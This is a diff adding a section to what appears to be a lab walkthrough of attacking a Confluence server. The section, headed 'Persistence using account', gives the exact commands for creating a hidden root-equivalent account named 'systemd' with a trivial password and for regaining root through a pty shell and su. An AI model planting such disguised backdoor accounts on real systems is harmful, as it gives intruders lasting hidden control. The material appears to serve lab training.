@@ -194,6 +194,26 @@ whoami
 root
 ```
 
+### Persistence using account
+- After gaining root access via privilege escalation, create root privileges account.
+- Allows attacker to regain root privileges by accessing the account.
+
+    ```
+    root@confluence:/tmp# useradd -ou 0 -g 0 systemd
+    root@confluence:/tmp# chpasswd <<<"systemd:systemd"
+    ```
+    Regain
+    ```
+    confluence@confluence:/tmp$ echo "import pty; pty.spawn('/bin/bash')" >/tmp/shell.py
+    confluence@confluence:/tmp$ python /tmp/shell.py
+    bash: /root/.bashrc: Permission denied
+    confluence@confluence:/tmp$ su systemd
+    Password: systemd
+    # whoami
+    whoami
+    root
+    ```
+	
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
 ```
